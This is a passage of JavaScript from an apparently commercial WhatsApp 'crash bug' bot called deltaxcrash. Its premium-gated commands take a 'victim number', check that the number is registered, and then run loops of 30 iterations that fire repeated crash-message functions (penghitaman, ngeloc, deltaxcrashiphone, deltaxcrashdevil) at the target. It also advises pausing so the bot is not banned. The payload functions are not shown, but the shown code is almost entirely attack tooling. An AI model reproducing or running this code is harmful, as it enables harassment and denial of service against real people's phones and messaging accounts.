  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "deltaxcrash-external": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "deltaxcrash-internal": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "deltacrsah-forme": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "deltacrsah-mekdi": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await deltaxcrash.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
//=================================================//
case 'maker': case '🌹': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'hardcore': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'spesial-war': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-close': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-crash': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-one': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
